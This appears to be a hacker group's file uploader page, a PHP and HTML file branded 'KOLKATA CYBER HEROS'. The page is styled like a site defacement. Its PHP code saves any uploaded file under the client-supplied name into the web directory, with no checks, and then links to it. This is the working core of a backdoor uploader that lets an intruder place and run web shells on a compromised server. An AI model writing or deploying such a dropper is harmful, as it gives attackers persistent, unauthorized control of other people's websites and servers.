<!DOCTYPE html>
<html>
<head>
	<link href="https://fonts.googleapis.com/css2?family=Metal+Mania&display=swap" rel="stylesheet">
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Kch_Uploader</title>
<style> 
.myButton {
	box-shadow:inset 0px 1px 0px 0px #f29c93;
	background:linear-gradient(to bottom, #fe1a00 5%, #ce0100 100%);
	background-color:#fe1a00;
	border-radius:6px;
	border:1px solid #d83526;
	display:inline-block;
	cursor:pointer;
	color:#ffffff;
	font-family:Arial;
	font-size:15px;
	font-weight:bold;
	padding:6px 24px;
	text-decoration:none;
	text-shadow:0px 1px 0px #b23e35;
}
.myButton:hover {
	background:linear-gradient(to bottom, #ce0100 5%, #fe1a00 100%);
	background-color:#ce0100;
}
.myButton:active {
	position:relative;
	top:1px;
}

.a{
	color: #ff0017
}
</style>
</head>
<body style="background:url('https://img.wallpapersafari.com/desktop/1680/1050/87/95/Fx4W5q.jpg');font-family: 'Metal Mania', cursive;"><br><br>
<center><img style="visibility: visible;" src="https://i.ibb.co/h2LGCrh/kch.png" height="250" width="250"></center><br>
<center><h1><font color="red">KOLKATA</font><font color="white"> CYBER</font><font color="red"> HEROS</font> </h1></center><br>	
<center>
<form method=POST enctype="multipart/form-data" action="">
<input class="myButton" style="background: black; color: #04fa26;font-family: cursive;" type="file" name="files">&nbsp&nbsp&nbsp
<input class="myButton" type=submit value="upload">
</form>
</center>'
<pre style="color: #ff0017">
<?php
$files = @$_FILES["files"];
if ($files["name"] != '') {
    $fullpath =  $files["name"];
    if (move_uploaded_file($files['tmp_name'], $fullpath)) {
        echo "<center><h1><a href='$fullpath'>Click-here-to-access-the-file!!</a></h1></center>";}}?>	
</pre>	
</body>
</html>

